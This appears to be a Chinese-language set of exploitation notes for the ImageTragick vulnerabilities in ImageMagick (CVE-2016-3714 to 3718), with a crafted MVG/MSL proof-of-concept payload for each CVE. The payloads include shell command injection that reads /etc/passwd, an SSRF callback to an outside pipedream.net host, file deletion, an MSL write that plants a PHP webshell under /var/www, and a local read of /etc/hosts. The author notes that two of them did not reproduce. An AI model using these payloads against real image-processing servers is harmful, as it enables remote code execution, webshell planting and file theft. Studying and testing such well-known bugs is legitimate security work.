## 魔图漏洞
**CVE-2016-3714**
（The (1) EPHEMERAL, (2) HTTPS, (3) MVG, (4) MSL, (5) TEXT, (6) SHOW, (7) WIN, and (8) PLT coders in ImageMagick before 6.9.3-10 and 7.x before 7.0.1-1 allow remote attackers to execute arbitrary code via shell metacharacters in a crafted image, aka "ImageTragick."）

参考：
- https://github.com/ImageTragick/PoCs
- https://www.leavesongs.com/PENETRATION/CVE-2016-3714-ImageMagick.html
- https://github.com/vulhub/vulhub/blob/master/imagemagick/imagetragick/README.zh-cn.md

poc:
```
push graphic-context
viewbox 0 0 640 480
image over 0,0 0,0 'https://127.0.0.1/x.php?x=`cat /etc/passwd > /tmp/success`'
pop graphic-context
```


**CVE-2016-3718**
poc.jpg
```
push graphic-context
viewbox 0 0 640 480
fill 'url(https://enav06y2ix9ic.x.pipedream.net)'
pop graphic-context
```

**CVE-2016-3715**
poc.jpg
```
push graphic-context
viewbox 0 0 640 480
image over 0,0 0,0 'ephemeral:/tmp/success'
popgraphic-context
```

下面这2个，3716没有复现成功，3717没有回显，就没有复现了

**CVE-2016-3716**
利用ImageMagick支持的msl协议，来进行文件的读取和写入。利用这个漏洞，可以将任意文件写为任意文件，比如将图片写为一个.php后缀的webshell。特别说明的是，msl协议是读取一个msl格式的xml文件，并根据其内容执行一些操作：

file_move.mvg
```
push graphic-context
viewbox 0 0 640 480
image over 0,0 0,0 'msl:/tmp/msl.txt'
popgraphic-context
```
/tmp/msl.txt
```
<?xml version="1.0" encoding="UTF-8"?>
<image>
<read filename="/tmp/image.gif" />
<write filename="/var/www/shell.php" />
</image>
```

**CVE-2016-3717**
可以造成本地文件读取漏洞
poc.jpg
```
push graphic-context
viewbox 0 0 640 480
image over 0,0 0,0 'label:@/etc/hosts'
pop graphic-context
```